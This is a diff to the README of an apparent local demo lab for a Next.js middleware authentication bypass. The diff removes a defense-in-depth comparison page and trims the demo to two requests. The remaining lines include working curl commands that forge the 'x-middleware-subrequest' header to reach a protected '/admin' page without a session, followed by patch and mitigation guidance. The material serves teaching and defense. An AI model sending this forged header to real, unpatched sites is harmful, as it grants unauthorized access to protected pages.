@@ -19,14 +19,12 @@ only authorization gate, an unauthenticated attacker reaches protected pages.
 | Route | Protection | Behavior under the bypass |
 |-------|-----------|---------------------------|
 | `/admin` | middleware **only** | ❌ exposed — attacker gets the page |
-| `/admin-secure` | middleware **+ in-page server-side check** | ✅ still blocked (defense-in-depth) |
 | `/login` | — | stub login that sets the `session` cookie |
 
 - `middleware.ts` — checks the `session` cookie and redirects unauthenticated
   users to `/login`. This is the gate the CVE lets an attacker skip.
-- `app/admin/page.tsx` — no internal check; relies on middleware alone.
-- `app/admin-secure/page.tsx` — re-checks the session **inside the page**, so it
-  holds even when middleware is bypassed.
+- `app/admin/page.tsx` — no internal check; relies on middleware alone, so the
+  forged header exposes it.
 
 ---
 
@@ -60,7 +58,7 @@ npm run dev          # leave running; serves http://localhost:3000
 ./demo.sh
 ```
 
-It fires the three requests and prints only the signal — status code, redirect
+It fires the two requests and prints only the signal — status code, redirect
 target, and whether the admin page leaked. Expected output on the vulnerable
 build:
 
@@ -70,14 +68,11 @@ build:
 [2] Attacker forges the header          GET /admin   (+ forged header)
   HTTP 200
   >>> BYPASS SUCCEEDED: admin page served with no session cookie
-[3] Same attack vs hardened page        GET /admin-secure   (+ forged header)
-  HTTP 307  ->  /login
 ```
 
 Talking point for step 2: *"No session cookie, no login — yet we get `200 OK`
 and the admin page, because the forged header made Next.js skip the middleware
-entirely. Step 3 is the same attack, but that page re-checks the session itself,
-so it still redirects."*
+entirely."*
 
 **Then show the fix.** In Terminal A, stop the server (Ctrl-C) and upgrade:
 
@@ -113,10 +108,6 @@ curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/admin
 curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3000/admin | grep -o "Welcome, authenticated admin"
 ```
 
-```bash
-curl -s -o /dev/null -w "%{http_code}\n" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3000/admin-secure
-```
-
 > **zsh tip:** paste the commands **without** the `#` comment lines. In zsh the
 > parentheses in a comment like `(307)` are treated as a glob and throw
 > `zsh: no matches found` / `unknown file attribute`. The `curl` lines above have
@@ -126,7 +117,7 @@ curl -s -o /dev/null -w "%{http_code}\n" -H "x-middleware-subrequest: middleware
 > long `<script>self.__next_f...>` blob in that output is Next.js's React Server
 > Components payload (normal framework output), not anything in this app.
 
-The sections below repeat the same three requests with the raw `curl -i` form
+The sections below repeat the same two requests with the raw `curl -i` form
 and explain why the patch works.
 
 ---
@@ -158,18 +149,8 @@ curl -i \
 # ...<h1>Welcome, authenticated admin</h1>...   <-- BYPASS: no session cookie needed
 ```
 
-**3. Same forged header vs. the defense-in-depth page → still blocked**
-
-```bash
-curl -i \
-  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
-  http://localhost:3000/admin-secure
-# HTTP/1.1 307 Temporary Redirect
-# location: /login
-```
-
-Even though middleware was bypassed, `/admin-secure` re-checks the session during
-render and redirects. This is the core lesson.
+The `200 OK` with the admin page body is the vulnerability: an unauthenticated
+request reached a route that middleware was supposed to protect.
 
 ---
 
@@ -225,7 +206,7 @@ You can see both sides in the installed source:
 
 1. **Never make middleware your only authorization boundary.** Enforce
    authorization again at the resource — the page, the route handler, and the
-   data layer. `/admin-secure` shows this.
+   data layer — so a skipped middleware does not mean a skipped auth check.
 2. **Keep framework dependencies patched.** This whole class of request-smuggling
    / header-trust bug is fixed by staying current.
 3. Treat all client-supplied headers as untrusted, including ones that "look
